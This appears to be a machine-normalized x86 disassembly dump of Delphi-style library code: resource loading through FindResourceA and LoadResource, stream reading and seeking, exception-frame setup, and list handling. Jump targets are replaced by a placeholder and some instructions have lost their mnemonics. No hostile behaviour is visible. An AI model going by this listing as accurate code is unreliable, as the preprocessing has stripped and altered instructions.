call sub_403380
test bl bl
jle r-xdata
call sub_408a58
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_41e22c
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4029b0
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41e264
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_41e288
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax esi
call sub_41e2b4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_41e2cc
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41dbc4
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41ddd0
sub_41e304
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_41e224
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41e32c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_41e304
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_41e358
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406ecc
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406eb0
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406ea0
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
test ecx ecx
jne r-xdata
sub_41e3e4
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4029b0
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_41e304
sub_41e434
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403360
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_4045e0
mov ecx eax
mov edx esi
mov eax edi
call sub_41e54c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_41e48c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403360
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx esi
mov eax edi
call sub_41e54c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_41e4dc
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e53f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e546
lea eax [ ebp - 0xc ]
call sub_404120
retn
sub_41e54c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41e4dc
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_41e224
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41e4dc
pop ecx
sub_41e5b8
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406e9c
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_41e608
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4027b4
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_41e650
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4027d4
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_41e754
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_404174
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_404174
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_41e7ac
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404210
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404680
mov al 0x1
inc ebx
sub_41e804
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41e87b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405b50
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_418380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e882
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_4173c8
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_405b50
mov ecx eax
mov eax esi
pop edx
call sub_40d7d4
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_405b50
sub_41e888
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41e92e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e935
lea eax [ ebp - 0x8 ]
call sub_404120
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404210
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_423fb0
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_408224
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41e950
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41b6b0
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41b6b0
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41b4f8
sub_41e988
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41b6b0
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41b6b0
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_41b544
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41b4f8
sub_41e9d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_41eb69
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_41ba18
mov edi eax
xor edx edx
push ebp
push sub_41eb4a
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eb51
mov eax [ rw-data ]
call sub_41ba7c
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41eb2b
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41ead9
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_41b654
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41b014
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eae0
mov eax [ ebp - 0x8 ]
call sub_403390
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_417688
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41e950
pop ecx
mov edx esi
mov eax edi
call sub_41b544
mov eax ebx
call sub_403390
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41e888
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_41e988
pop ecx
inc esi
sub_41eae0
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403390
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41b654
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
sub_41eb78
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_41ba18
mov edi eax
xor eax eax
push ebp
push sub_41ec13
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41ba7c
retn
mov edx ebx
mov eax edi
call sub_41b654
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_41b544
mov eax esi
call sub_403390
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_408224
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41ec24
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_41ba18
mov edi eax
xor eax eax
push ebp
push sub_41ec9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41ba7c
retn
mov edx ebx
mov eax edi
call sub_41b654
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_41b544
mov eax esi
call sub_403390
sub_41eccc
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
pop ecx
pop edx
pop ebx
retn
sub_41ed10
push ebx
push esi
push edi
call sub_40375c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e650
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_41ed4c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_420c24
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_420d34
call sub_41ecc0
sub_41ed70
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_408224
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_404120
sub_41eda4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_408224
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_420c24
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41ee65
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41f1e8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41f1e8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ee6c
mov eax [ ebp - 0x8 ]
call sub_403390
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_420d34
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41ecc0
sub_41ee94
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41eeb4
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_4043bc
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_403614
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41ecc0
sub_41ef1c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_41ba18
mov esi eax
xor edx edx
push ebp
push sub_41ef8c
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ef93
mov eax [ rw-data ]
call sub_41ba7c
retn
mov edx ebx
mov eax esi
call sub_41b654
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403390
mov edx ebx
mov eax esi
call sub_41b544
sub_41ef98
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f0a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f0ae
lea eax [ ebp - 0x8 ]
call sub_404120
retn
xor edx edx
push ebp
push sub_41f08a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f0dc
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41e7ac
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_41b654
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_4041b8
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41e888
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_41b654
call sub_41ef1c
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_41b654
mov edx eax
mov eax [ rw-data ]
call sub_41b990
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_41b7a0
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_41f0b8
push ebx
mov ebx eax
mov eax ebx
call sub_41f1ac
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41dbc4
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41f0dc
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403390
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_41b654
call sub_403390
inc edi
dec esi
jne r-xdata
sub_41f118
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_4032d8
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_41aae0
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_40331c
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_41ab58
mov edi eax
mov edx [ esp + 0x4 ]
call sub_41aa58
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4032f4
test al al
jne r-xdata
sub_41f1e8
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41f234
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41f234
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
sub_41f284
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41f2cf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_420a84
mov eax [ ebp - 0x4 ]
call sub_4043e0
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f2d6
lea eax [ ebp - 0x4 ]
call sub_404120
retn
call sub_41ecc0
sub_41f2dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41f37c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41ee80
test al al
jne r-xdata
mov eax ebx
call sub_41ee80
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c2f0
jmp r-xdata
mov eax ebx
call sub_41f1c4
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41fdec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f383
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_41c224
mov esi eax
mov eax ebx
call sub_41fde4
jmp r-xdata
mov eax ebx
call sub_41fd34
mov eax ebx
call sub_41ee80
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41ff50
mov eax ebx
call sub_41fdec
sub_41f3ac
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4051c8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_41b4f8
inc esi
dec ebx
jne r-xdata
sub_41f3e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_4240cc
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4051c8
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405384
add esp 0x4
mov edx ebx
mov eax edi
call sub_4240a0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4051c8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_4240a0
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41f460
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4051c8
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
